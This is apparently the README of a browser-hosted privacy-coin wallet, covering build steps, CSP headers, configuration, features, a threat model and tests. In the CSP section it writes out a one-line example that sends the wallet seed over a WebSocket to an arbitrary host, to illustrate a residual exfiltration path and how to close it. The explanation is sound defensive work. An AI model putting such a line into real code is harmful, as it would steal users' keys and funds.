# The Qnero browser wallet (M10)

A wallet that runs in a page. It creates a spending key here, encrypts it here,
scans the chain here, proves a payment here in a background worker, and
contacts nothing but the node you configure. There is no server component and
there is no account: the only thing between this page and a chain is one
WebSocket to a node.

```
cd wallet-web
nice -n 19 npm ci
./scripts/stage-wasm.sh --threaded     # copies the prover into public/wasm/
nice -n 19 npm run dev                 # http://127.0.0.1:5173
```

The dev server and the preview server both send `Cross-Origin-Opener-Policy:
same-origin` and `Cross-Origin-Embedder-Policy: require-corp`, which is what a
page needs before `SharedArrayBuffer` exists and therefore before the threaded
prover can run. A production host has to send them itself; without them the
page silently falls back to the single-threaded module, and the settings screen
says which one it got.

### What a host should send

The built `index.html` carries its own content policy, so a static drop is
already covered. A host that can send headers should send the same policy plus
the two directives a `<meta>` element cannot express:

```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
Content-Security-Policy: default-src 'none'; script-src 'self' 'wasm-unsafe-eval';
  style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self';
  connect-src 'self' ws: wss:; worker-src 'self' blob:; base-uri 'none';
  form-action 'none'; frame-ancestors 'none'
```

The policy is one constant in `vite.config.ts` and both the tag and the header
come from it, so they cannot drift. `'wasm-unsafe-eval'` is what lets the
prover compile. `'unsafe-inline'` in `style-src` is for the `style` attributes
React and Radix write, which have no nonce.

What it refuses, measured against a built `dist/` rather than read off the
specification: every `http(s)` destination, every third-party script, style,
image and font, every `<base>` rewrite and every form post. **What the wide
form still permits is a WebSocket to any host**: with `connect-src 'self' ws:
wss:`, `new WebSocket('wss://somewhere/' + seed)` raises no violation. That is
the residual exfiltration path, and it is the price of choosing the endpoint at
runtime from the settings screen.

A deployment with a fixed node should close it at build time:

```
QNERO_ENDPOINT=wss://node.example npm run build
```

That pins `connect-src` to `'self' wss://node.example` and drops the two wide
schemes. The settings screen can then only be pointed at another node by
rebuilding, which is the trade: one origin, or any host.

The prover is not built by this app. It comes from `crates/qnero-prover-wasm`:

```
cd ../crates/qnero-prover-wasm
./scripts/build-wasm.sh                # the single-threaded module
./scripts/build-threaded-wasm.sh       # the threaded one, nightly + -Z build-std
```

## Configuration

`public/config.json` is read at startup, so one build serves a devnet and a
testnet and nothing about a chain is compiled in.

```json
{
  "rpcEndpoint": "ws://127.0.0.1:9944",
  "chainName": "Qnero devnet",
  "wasmBase": "wasm/",
  "numLeaves": 6,
  "expectedSendSeconds": { "threaded": 23, "single": 55 }
}
```

- `rpcEndpoint` is the default. The settings screen overrides it and that
  choice is what persists.
- `wasmBase` is where the prover is served from, relative to the page. The
  threaded module, when there is one, lives at `wasmBase + "threaded/"`.
- `numLeaves` is the private batch's leaf-slot count and has to match the
  runtime's embedded verifier. A proof built at another N has a public-input
  length that verifier cannot read, and the refusal arrives after the whole
  proving cost.
- `expectedSendSeconds` is what this build tells somebody to expect while a
  payment runs, per module, from the "Send to settled" column of the M10 table
  in `docs/BENCH.md`. That interval rather than the proof's, because the
  sending screen prints this beside a clock that starts at the send button: a
  proving-only figure there is exceeded about halfway through every correct
  payment. After the first payment the screen quotes what this machine actually
  took instead. The page prints the figure for the module it is running,
  because the threaded one proves in about a third of the time and a single
  figure beside a live thread count is wrong for one of the two. A plain number
  is still read, as both.

`?prover=single` in the URL pins the single-threaded module on an origin that
could run the threaded one. It is how both rows in `docs/BENCH.md` are measured
on one machine, and how a bug report can say whether the single-threaded module
has the bug too.

## What it does

- **Create a wallet.** 32 bytes from `crypto.getRandomValues`, shown once as
  eight groups of eight hex characters, then three of the eight groups asked
  back before the wallet is written. Somebody who wrote nothing down cannot
  answer, which is the point: that screen is the last moment the key is
  recoverable. Hex and no code beside it: a QR of a spend key is harvested by
  any camera, screen share or shoulder in the room in one frame, and nothing
  in this wallet scans one.
- **Restore from a seed.** The 64 hex characters and nothing else. There is no
  restore height, because a scan that started at a height the wallet named
  would tell the node roughly when the wallet was created.
- **Lock.** PBKDF2-SHA-256 at 600,000 iterations over a 16-byte salt derives
  one non-extractable AES-256-GCM key. The eight-character floor is enforced
  in `wallet/crypto.ts`, where the only path to a key is, rather than on the
  screen that asks for one. Each note's `rho`, `r`, `nullifier` and
  `memo` and the seed itself are sealed under it with a fresh 12-byte IV per
  record per write, bound to their own slot with additional data.
- **Sync.** Every ciphertext on the chain is read by leaf index in batches and
  tried against this wallet's viewing key in the worker; coinbase notes are
  rebuilt from the miner key; the whole settled nullifier set is paged and
  spent status is decided locally. The node is never told which leaves or
  which nullifiers are this wallet's.
- **Balance.** Unspent, pending, off chain, and what one payment can reach,
  with the note table under it.
- **Send.** The fee floor from the runtime's own constants, note selection
  largest first up to two notes, the Merkle paths rebuilt locally at the
  anchor, the header preimage checked against `chain_getBlockHash` before
  anything is proved, the proof built in the worker with its phases named, the
  settlement submitted as a bare unsigned extrinsic, and inclusion matched byte
  for byte.
- **Receive.** The address as text and as a code, and the miner key behind a
  labelled control, because the miner key is not the address and it carries the
  coinbase viewing key.
- **Settings.** The node, the lock, a rescan, and a plain statement of what
  this wallet reveals to the node.

### What it cannot do

**Shielding is a command-line step.** Entering the pool is a signed extrinsic,
and the signature is ML-DSA-87 under the FIPS 204 context. The wasm module
exports no signing at all, and `qnero-wallet`'s extrinsic, fee and selection
modules are not wasm-clean (they reach for `libc`, `ureq`, `clap` and
`twox-hash`). So a browser wallet can predict and recognise a shield, and it
cannot make one. Fund it from `qnero-wallet shield` followed by a `send`, or
from a node configured with its miner key. Closing this properly means a
wasm-clean crate split and an ML-DSA-87 signer in the module, and that is not
M10.

## Threat model, in plain words

**This is dev grade and browser hosted. Use it on a dev chain.**

- **The page host can do anything the page can.** Whoever serves these files
  can serve different ones tomorrow, and the different ones can send the seed
  somewhere. There is no code signing in a browser and no way for this page to
  prove to you that it is the page you read the source of. That is the whole
  trust assumption and nothing below softens it.
- **A locked wallet is only as strong as its passphrase.** 600,000 PBKDF2
  iterations is about a second per guess on this workstation and far less on a
  machine built for guessing. A short passphrase is a short delay, and eight
  characters is a floor rather than a recommendation. The count a store was
  written under is recorded in the store and is what opens it, so raising this
  build's figure seals new wallets harder and leaves existing ones readable.
- **Zeroing buys one buffer and no more.** A JavaScript `String` is immutable
  and garbage collected: a seed that has ever been a string cannot be wiped,
  and `crypto.subtle.decrypt` hands back a buffer allocated before this code
  sees it. Secrets are carried as `Uint8Array` and `fill(0)` when done, which
  is a real erase of that buffer. The wasm module's own zeroize is worth the
  same narrow thing, because linear memory is an `ArrayBuffer` the host can
  read at any time.
- **IndexedDB is evictable, and the seed is what recovers from that.** The
  wallet asks for persistent storage and reports the answer rather than
  assuming it. Write the seed down: every note re-derives from it, because
  every note's plaintext is on the chain inside its ciphertext, so what an
  eviction costs is a full rescan and the record of which notes are spent.
  Without the seed it costs the wallet.
- **The store keeps the value graph in the clear.** Four fields are sealed,
  plus the seed: `rho`, `r`, `nullifier` and `memo`. Everything else is
  plaintext by choice, so that a locked wallet can still show a balance and
  still sync: the address, and per note its commitment, its leaf index, its
  block, its value, its origin and whether it is spent. So a copied browser
  profile gives up this wallet's complete receive history mapped onto public
  leaf indices, with no passphrase guess needed, which is the linkage the pool
  exists to hide. A threat model that wants the graph hidden has to seal
  `value` and `leafIndex` too and give up the locked balance screen.
  `src/wallet/model.ts` states the same list beside the type. A submitted
  settlement's own bytes used to sit in the pending row in the clear, and the
  pallet reads a settlement's nullifiers out of the proof before it verifies
  anything, so that row published for every payment that did not land exactly
  what the sealed field holds back. It is gone.
- **What a chain reader sees** is a settlement, its fee, its anchor block, two
  commitments and two ciphertexts of a fixed size. Not the amounts, not the
  sender, not the recipient, not which output is the change. The gap between a
  spend's anchor block and its inclusion block is public and it tracks this
  machine's speed.
- **What the node learns** is your network address, that a wallet syncs from
  it and roughly how often, and the exact bytes of every settlement submitted
  through it. It is never told which leaf or which nullifier is yours. The one
  request that names a nullifier is the confirmation of a settlement this
  wallet has just broadcast, whose proof published both of them a moment ago.

## Threads, and what they cost

Proving runs in a dedicated `Worker`, always, never on the main thread. On a
cross-origin isolated origin the worker loads the threaded module and starts a
rayon pool of `min(navigator.hardwareConcurrency, 4)`.

The cap is four on purpose. Beyond four the measured return falls off, every
thread reserves its own stack against a shared memory whose maximum is declared
at build time, and a wallet that takes every core of the machine it is a tab on
is a wallet somebody closes. The circuits hold most of a gigabyte of linear
memory once built and wasm linear memory never shrinks, so the circuits are
built once per worker and every later payment is answered from that build. The
settings screen offers stopping the worker by name, which is the only thing
that gives the memory back; starting it again loads the module afresh and the
next payment pays the build.

`docs/BENCH.md` carries the numbers for both modules.

## Tests

```
nice -n 19 npm run lint
nice -n 19 npm run typecheck
nice -n 19 npm test
nice -n 19 npm run build
nice -n 19 npm run e2e       # starts its own dev node, proves in the browser
```

The unit tests cover the encryption at rest and what it refuses, the store's
own contract, the fee floor and the memo pad against a runtime's constants,
note selection and the conflict-set rule, memo escaping, the node gates and the
spent reconciliation in both directions, and the lint fence that keeps
`zkTree_getMerkleProof` out of every spelling it has.

`tests/privacy.test.ts` is the one that needs explaining. "The node learns
nothing" is a property of the request stream: a wallet that asked one point
question per held nullifier would return exactly the same balance as one that
paged the whole set, so no assertion over an answer can see the difference. It
drives the real read layer through a recording transport and asserts on the
calls: no request carries a nullifier, leaves are read as one contiguous range,
every read of a pass is pinned to one block hash, and nothing outside four
public-read methods is ever called.

It drives a payment the same way, because the spend path is where the property
is easiest to lose. A spend needs one Merkle path, and narrowing the leaf read
to the leaves that path touches would tell the node which leaf is being spent
while passing the lint fence, which keys on a name. The e2e records the socket
itself, so the allowlist also covers what `@polkadot/api` asks on its own.

The Playwright suite starts a `--dev --tmp` node at one mining thread, has the
command-line wallet shield and then pay the address the browser wallet creates,
proves a payment in the browser against that chain, has the command-line wallet
read the payment back, and stops and restarts the prover from the settings
screen to check that nothing syncs while it is stopped. The node is stopped by
pidfile and the port is confirmed closed.

`QNERO_DEVNET_PORT` moves that chain off 9944, which is the port every
Substrate node defaults to and therefore the one most likely to be taken:

```
QNERO_DEVNET_PORT=9955 nice -n 19 npm run e2e
QNERO_DEVNET_PORT=9955 QNERO_PROVER=single nice -n 19 npm run e2e
```

The node, the command-line wallet and the browser all follow it, so there is
nothing else to change.

## Design

The look and the screen flow follow MyMonero's web wallet (BSD-3-Clause). What
is carried over and what is not is set out in `NOTICE`, which also states why
the accent is Qnero's own and why MyMonero's name and logo appear nowhere here.

The plumbing is the sibling web wallet's, `myqrlwallet-frontend`: Vite, React
19, TypeScript, Tailwind v4 configured in CSS, Radix primitives under
`src/components/UI`, `class-variance-authority` with `clsx` and `tailwind-merge`
behind one `cn()`, `lucide-react` icons where MyMonero uses an icon,
`react-hook-form` for the forms and `react-router` for the screens. The
WebCrypto construction is that wallet's too, iteration for iteration.

Where MyMonero's flow assumes a light-wallet server, this one does not have
one, and the settings screen says so in the place that wallet keeps its server
address.
